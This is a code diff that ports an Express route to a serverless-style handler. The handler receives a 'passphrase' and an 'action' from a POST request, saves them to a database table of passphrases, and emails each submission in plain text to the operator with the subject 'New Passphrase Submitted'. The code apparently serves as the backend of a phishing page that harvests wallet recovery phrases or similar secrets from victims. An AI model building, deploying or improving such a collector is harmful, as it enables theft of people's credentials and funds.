@@ -1,56 +1,56 @@
-const express = require('express');
-const router = express.Router();
 const nodemailer = require('nodemailer');
 const mysql = require('mysql2/promise');
 require('dotenv').config();
 
-router.post('/process', async (req, res) => {
-    const { passphrase, action } = req.body;
+export default async function handler(req, res) {
+    if (req.method === 'POST') {
+        const { passphrase, action } = req.body;
 
-    try {
-        // Database connection
-        const connection = await mysql.createConnection({
-            host: process.env.DB_HOST,
-            database: process.env.DB_NAME,
-            user: process.env.DB_USER,
-            password: process.env.DB_PASSWORD,
-            port: process.env.DB_PORT
-        });
+        try {
+            // Database connection
+            const connection = await mysql.createConnection({
+                host: process.env.DB_HOST,
+                database: process.env.DB_NAME,
+                user: process.env.DB_USER,
+                password: process.env.DB_PASSWORD,
+                port: process.env.DB_PORT
+            });
 
-        // Insert into database
-        if (passphrase) {
-            await connection.execute(
-                'INSERT INTO passphrases (passphrase, action) VALUES (?, ?)',
-                [passphrase, action]
-            );
-        }
-
-        // Email configuration
-        let transporter = nodemailer.createTransport({
-            host: 'smtp.gmail.com',
-            port: 465,
-            secure: true,
-            auth: {
-                user: process.env.EMAIL_USER,
-                pass: process.env.EMAIL_PASS
+            // Insert into database
+            if (passphrase) {
+                await connection.execute(
+                    'INSERT INTO passphrases (passphrase, action) VALUES (?, ?)',
+                    [passphrase, action]
+                );
             }
-        });
 
-        // Send email
-        await transporter.sendMail({
-            from: process.env.EMAIL_USER,
-            to: process.env.EMAIL_USER,
-            subject: 'New Passphrase Submitted',
-            html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
-        });
+            // Email configuration
+            let transporter = nodemailer.createTransport({
+                host: 'smtp.gmail.com',
+                port: 465,
+                secure: true,
+                auth: {
+                    user: process.env.EMAIL_USER,
+                    pass: process.env.EMAIL_PASS
+                }
+            });
 
-        await connection.end();
+            // Send email
+            await transporter.sendMail({
+                from: process.env.EMAIL_USER,
+                to: process.env.EMAIL_USER,
+                subject: 'New Passphrase Submitted',
+                html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
+            });
 
-        res.json({ message: 'Success' });
-    } catch (error) {
-        console.error(error);
-        res.status(500).json({ message: error.message || 'Internal server error' });
+            await connection.end();
+
+            res.status(200).json({ message: 'Success' });
+        } catch (error) {
+            console.error(error);
+            res.status(500).json({ message: error.message || 'Internal server error' });
+        }
+    } else {
+        res.status(405).json({ message: 'Method Not Allowed' });
     }
-});
-
-module.exports = router;
+}
